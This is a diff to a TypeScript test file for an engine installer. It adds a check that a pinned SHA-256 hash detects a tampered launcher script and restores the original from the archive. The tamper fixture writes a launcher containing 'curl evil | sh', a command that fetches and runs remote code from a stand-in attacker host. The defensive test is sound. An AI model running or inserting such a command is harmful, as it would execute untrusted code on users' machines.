@@ -40,11 +40,9 @@ function makeFixture(
   const stage = path.join(base, 'stage');
   const root = path.join(stage, ENGINE_PIN.name);
   mkdirSync(path.join(root, 'bin'), { recursive: true });
+  const launcher = '#!/bin/sh\necho fake\n';
   if (!opts.omitLauncher) {
-    writeFileSync(
-      path.join(root, 'bin', 'emdash-workspace-server'),
-      '#!/bin/sh\necho fake\n',
-    );
+    writeFileSync(path.join(root, 'bin', 'emdash-workspace-server'), launcher);
   }
   writeFileSync(path.join(root, 'manifest.json'), JSON.stringify(manifest));
   const bundledArchiveDir = path.join(base, 'bundle');
@@ -57,7 +55,11 @@ function makeFixture(
   const sha256 = createHash('sha256')
     .update(readFileSync(archivePath))
     .digest('hex');
-  const pin: EnginePin = { ...ENGINE_PIN, sha256 };
+  const pin: EnginePin = {
+    ...ENGINE_PIN,
+    sha256,
+    launcherSha256: createHash('sha256').update(launcher).digest('hex'),
+  };
   const installDir = path.join(base, 'userData', 'engine', pin.version);
   const paths: EnginePaths = {
     installDir,
@@ -65,7 +67,7 @@ function makeFixture(
     runDir: path.join(base, 'userData', 'engine', 'run'),
     socketPath: path.join(base, 'userData', 'engine', 'run', 'workspace.sock'),
     stateDir: path.join(base, 'userData', 'engine', 'state'),
-    worktreesDir: path.join(base, 'userData', 'engine', 'worktrees'),
+    worktreesDir: path.join(base, 'userData', 'worktrees'),
     logPath: path.join(base, 'userData', 'engine', 'engine.log'),
   };
   return { pin, paths, bundledArchiveDir, archivePath };
@@ -103,15 +105,47 @@ describe('installEngine', () => {
       { bundledArchiveDir: f.bundledArchiveDir, ...DARWIN_ARM },
       f.pin,
     );
-    // Mark the installed launcher; a re-extract would overwrite the mark.
-    writeFileSync(f.paths.launcherPath, '#!/bin/sh\necho marked\n');
+    // Leave a mark beside the install; a re-extract (rm + tar) would lose it.
+    const marker = path.join(f.paths.installDir, 'marker.txt');
+    writeFileSync(marker, 'still here');
     const again = await installEngine(
       f.paths,
       { bundledArchiveDir: f.bundledArchiveDir, ...DARWIN_ARM },
       f.pin,
     );
     expect(again.ok).toBe(true);
-    expect(readFileSync(f.paths.launcherPath, 'utf8')).toContain('echo marked');
+    expect(readFileSync(marker, 'utf8')).toBe('still here');
+  });
+
+  // Review round 2: the archive was hash-checked once, at extraction, and
+  // the extracted launcher — a user-writable shell script main spawns on
+  // every look — was trusted forever after. Now it is re-hashed against
+  // ENGINE_PIN.launcherSha256 on every verify.
+  it('refuses a launcher that is not the pinned one, and replaces it from the archive on the next install', async () => {
+    const f = makeFixture('tampered', GOOD_MANIFEST);
+    await installEngine(
+      f.paths,
+      { bundledArchiveDir: f.bundledArchiveDir, ...DARWIN_ARM },
+      f.pin,
+    );
+    writeFileSync(f.paths.launcherPath, '#!/bin/sh\ncurl evil | sh\n');
+
+    const refused = await verifyInstalledEngine(f.paths, f.pin);
+    expect(refused).toMatchObject({
+      ok: false,
+      reason: 'manifest-mismatch',
+      message: expect.stringContaining('is not the pinned one'),
+    });
+
+    const restored = await installEngine(
+      f.paths,
+      { bundledArchiveDir: f.bundledArchiveDir, ...DARWIN_ARM },
+      f.pin,
+    );
+    expect(restored.ok).toBe(true);
+    expect(readFileSync(f.paths.launcherPath, 'utf8')).toBe(
+      '#!/bin/sh\necho fake\n',
+    );
   });
 
   it('refuses an archive whose sha256 is not the pinned one, and extracts nothing', async () => {
@@ -193,6 +227,8 @@ describe('ENGINE_PIN and engine.lock.json agree', () => {
     expect(lock.protocolVersion).toBe(ENGINE_PIN.protocolVersion);
     expect(lock.sourceCommit).toBe(ENGINE_PIN.sourceCommit);
     expect(lock.targets[ENGINE_PIN.target].sha256).toBe(ENGINE_PIN.sha256);
+    expect(lock.launcherSha256).toBe(ENGINE_PIN.launcherSha256);
+    expect(lock.launcherRelPath).toBe(ENGINE_PIN.launcherRelPath);
     expect(lock.targets[ENGINE_PIN.target].file).toBe(
       `${ENGINE_PIN.name}-${ENGINE_PIN.version}-${ENGINE_PIN.target}.tar.gz`,
     );
